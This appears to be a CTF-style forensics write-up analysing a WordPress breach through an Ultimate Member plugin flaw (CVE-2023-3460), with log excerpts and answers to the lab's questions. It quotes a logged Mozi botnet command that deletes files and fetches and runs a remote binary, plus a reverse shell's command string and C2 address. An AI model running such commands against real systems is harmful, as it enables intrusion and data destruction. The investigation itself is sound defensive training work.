# Ultimatum

## Speech
```
One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believe this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.
```

## Analysis
### Access.log
1. We have a catscale dump : https://github.com/WithSecureLabs/LinuxCatScale?tab=readme-ov-file (need to extract with 7z x)
2. We know the attack was against wordpress, so let's begin with the var/log/apach2/access.log (or maybe nginx)
    - after extracting `logs/ip-172-31-11-131-20230808-0937-var-log.tar.gz` we get the folder `var/log/apache2`
    - we can see at the end of the access.log :
    ```
    $ tail -n30 access.log
    198.16.74.45 - - [08/Aug/2023:08:57:15 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree HTTP/1.1" 200 11554 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    212.224.107.86 - - [08/Aug/2023:08:57:15 +0000] "GET / HTTP/1.1" 200 11615 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
    212.224.107.86 - - [08/Aug/2023:08:57:18 +0000] "GET /public/config.js HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
    212.224.107.86 - - [08/Aug/2023:08:57:21 +0000] "GET /config.js HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
    198.16.74.45 - - [08/Aug/2023:08:57:47 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree HTTP/1.1" 200 11426 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:57:50 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree HTTP/1.1" 200 11554 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    3.110.136.25 - - [08/Aug/2023:08:58:02 +0000] "GET /wp-admin/theme-editor.php?theme=twentytwentythree&file=patterns%2Fhidden-comments.php&wp_scrape_key=bfc415652d48bcf10671c0948544fee8&wp_scrape_nonce=771812714 HTTP/1.1" 200 12139 "-" "WordPress/6.2.2; http://3.110.136.25"
    3.110.136.25 - - [08/Aug/2023:08:58:02 +0000] "GET /?wp_scrape_key=bfc415652d48bcf10671c0948544fee8&wp_scrape_nonce=771812714 HTTP/1.1" 200 12974 "-" "WordPress/6.2.2; http://3.110.136.25"
    198.16.74.45 - - [08/Aug/2023:08:58:02 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 592 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:07 +0000] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,code-editor,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.2.2 HTTP/1.1" 200 99649 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:16 +0000] "GET /wp-admin/plugins.php HTTP/1.1" 200 11518 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:20 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 18752 "http://3.110.136.25/wp-admin/plugins.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:20 +0000] "GET /wp-includes/css/editor.min.css?ver=6.2.2 HTTP/1.1" 200 6212 "http://3.110.136.25/wp-admin/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:20 +0000] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.2.2 HTTP/1.1" 200 81088 "http://3.110.136.25/wp-admin/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:21 +0000] "GET /wp-includes/js/api-request.min.js?ver=6.2.2 HTTP/1.1" 200 939 "http://3.110.136.25/wp-admin/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:45 +0000] "GET /wp-admin/themes.php HTTP/1.1" 200 12150 "http://3.110.136.25/wp-admin/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:58:52 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:08:59:46 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/themes.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:00:46 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/themes.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:00:51 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:01:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:03:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:05:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:07:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    198.16.74.45 - - [08/Aug/2023:09:09:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 576 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    212.224.107.86 - - [08/Aug/2023:09:14:22 +0000] "GET /config/default.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
    212.224.107.86 - - [08/Aug/2023:09:14:25 +0000] "GET /config.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36"
    212.224.107.86 - - [08/Aug/2023:09:14:28 +0000] "GET /config/config.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"
    212.224.107.86 - - [08/Aug/2023:09:14:31 +0000] "GET /credentials/config.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
    120.85.112.241 - - [08/Aug/2023:09:25:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 491 "-" "Hello, world"
    ```
    - The last line is very interesting : `/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1`
    - `120.85.112.241` an IP used by the attacker
3. That was the easy to see attack, but now we know we can learn a lot from this file, let's open it and see what is in it
    - After looking at the log we see this type of line : `23.106.60.163 - - [08/Aug/2023:08:32:16 +0000] "POST /xmlrpc.php HTTP/1.1" 200 420 "http://3.110.136.25/" "WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)"`
    - We now know the attacker also used the IP `23.106.60.163`
    - Also he used `wpscan`
    - This IP is our wordpress : `3.110.136.25`
4. After the wpscan we can see that :
    - I added the line number 2210 in this case   
    ```
    2210 23.106.60.163 - - [08/Aug/2023:08:33:58 +0000] "GET //wp-content/plugins/ultimate-member/readme.txt HTTP/1.1" 200 38499 "-" "python-requests/2.28.1"
    2210 23.106.60.163 - - [08/Aug/2023:08:33:58 +0000] "GET //wp-content/plugins/ultimate-member/readme.txt HTTP/1.1" 200 38499 "-" "python-requests/2.28.1"
    2211 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "GET //index.php/register/ HTTP/1.1" 301 295 "-" "Secragon Offensive Agent"
    2212 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "GET /index.php/register/ HTTP/1.1" 200 11367 "-" "Secragon Offensive Agent"
    2213 23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "POST //index.php/register/ HTTP/1.1" 302 951 "-" "Secragon Offensive Agent"
    2214 23.106.60.163 - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/secragon/ HTTP/1.1" 200 14335 "-" "Secragon Offensive Agent"
    2215 198.16.74.45 - - [08/Aug/2023:08:35:10 +0000] "GET / HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    ```
    - What do we have ? After the wp-scan the user made a GET to the readme.txt of the ultimate-member plugin, why ? Maybe wpscan find something about this plugin :)
    - by looking at the log at the line 2218 we see the version of ultimate-member which is 2.6.4, now we can search for vulnerability on this version
    - I searched that : `wordpress ultimate member vulnerability` then I clicked on the [cvedetails](https://www.cvedetails.com/vulnerability-list/vendor_id-16964/Ultimatemember.html) link and we can look at the vuln concerning our version (we can also look at the timestamp) and we find that :
    ![vuln ultimate](./img/00_cve_ultimate.png)
    - This vuln is referenced on wpscan (two links) : [the CVE + PoC](https://wpscan.com/vulnerability/694235c7-4469-4ffd-a722-9225b19e98d7/) and [the proof this vuln was exploited in the wild](https://wpscan.com/blog/hacking-campaign-actively-exploiting-ultimate-member-plugin/)
    - Now take a second look at our 7 line of logs, we can see, at line 2213, a POST request to `/register`, exactly what they do in the PoC
5. We know the attacker exploit a CVE in order to create an admin account
6. Some weird things with secragon :/ I don't really know what is it...
7. Looks like we can't get more in this file...

### Misc folder
1. In `ip-172-31-11-131-20230808-0937-dev-dir-files.txt` we see someone used LinEnum (script to find privesc)
2. In : `ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt` we have what looks like php files
    - `cat ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt| grep "shell"` : `// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`
    - It looks like the attacker upload the file `php-reverse-shell.php` from pentestmonkey
    - go in the file and search for "php-reverse-shell" we find this reverse shell is named : 
    ```
    ==> /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
    <?php
    // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
    ```
    - `/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php` in the file `ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt`

## Questions
1. Which security scanning tool was utilized by the attacker to fingerprint the blog website?
    > wpscan/3.8.24
    - cf. Analysis > access.log > 3
2. Which CVE was exploited by the attacker?
    > CVE-2023-3460
    - cf. Analysis > access.log > 4
3. What was the IP Address utilized by the attacker to exploit the CVE?
    > 23.106.60.163
    - cf. Analysis > access.log > 4
4. What is the name of the backdoor user added to the blog as part of the exploitation process?
    > secragon
    - Not sure why xD
5. After the exploit, the SOC team observed that the attacker's IP address changed and from the logs, it seems that the attacker manually explored the website after logging in. The SOC team believes that the previous IP seen during exploitation was a public cloud IP. What is the IP Address the attacker used after logging in to the site?
    > 198.16.74.45
    - after that : Analysis > access.log > 4 we see a lot of GET request from this IP
6. The SOC team has suspicions that the attacker added a web shell for persistent access. Confirm the full path of the web shell on the server.
    > /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php
    - cf. Analysis > Misc folder > 2
7. What was the value of the $shell variable in the web shell?
    > 'uname -a; w; id; /bin/bash -i';
    - Open the file of Analysis > Misc folder > 2 and look at the $shell variable in the webshell
8. What is the size of the webshell in bytes?
    > 2592
    - We can look for all the occurence of this file :
    ```
    grep -ri hidden-comments
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt.bak:==> /root/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt.bak: * Slug: twentytwentythree/hidden-comments
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt.bak:==> /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
    ip-172-31-11-131-20230808-0937-full-timeline.csv:263776,1,/root/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-comments.php,2023-07-12 11:54:32.622305431 +0000,2022-09-26 18:34:14.000000000 +0000,2023-07-12 11:54:26.502444381 +0000,-,root,root,-rw-r--r--,2140
    ip-172-31-11-131-20230808-0937-full-timeline.csv:267656,1,/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php,2023-08-08 08:58:02.856871375 +0000,2023-08-08 08:58:02.816872892 +0000,2023-08-08 08:58:02.816872892 +0000,-,www-data,www-data,-rw-r--r--,2592
    ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt:0bcda7344217eaa3e34fd2c80759fe450adc7aad  /root/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-comments.php
    ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt:e22e879a941b293ac944d2a6289b2d033dbe646b  /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt:==> /root/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt: * Slug: twentytwentythree/hidden-comments
    ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt:==> /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php <==
    ```
    - In the full timeline we have the size of the file
9. The SOC team believes that the attacker utilized the webshell to get RCE on the server. Can you confirm the C2 IP and Port?
    > 43.204.24.76:6969
    - cf. question 7 just before the shell command we have the IP and port of the attacker
10. What is the process ID of the process which enabled the Threat Actor (TA) to gain hands-on access to the server?
    > 234521
    - What is stored in the $shell variable (question 7) is what will be executed
    - the file `ip-172-31-11-131-20230808-0937-process-cmdline.txt` in `Process_and_Network` give us the commandline for the crresponding process and by looking in the file we see :
    ```
    ==> /proc/234517/cmdline <==
    sh-cuname -a; w; id; /bin/bash -i
    ```
    - Then we can take a look at the file `ip-172-31-11-131-20230808-0937-process-details.txt`and grep for the pid 234517, this file gave us insight about the PID and we can see this process is the parent of the `234521` which is, the webshell (234517) spawned a reverse shell for the attacker (234521)
11. What is the name of the script/tool utilized as part of internal enumeration and finding privilege escalation paths on the server?
    > LinEnum.sh
    - We can see it in Misc/ip-172-31-11-131-20230808-0937-dev-dir-files.txt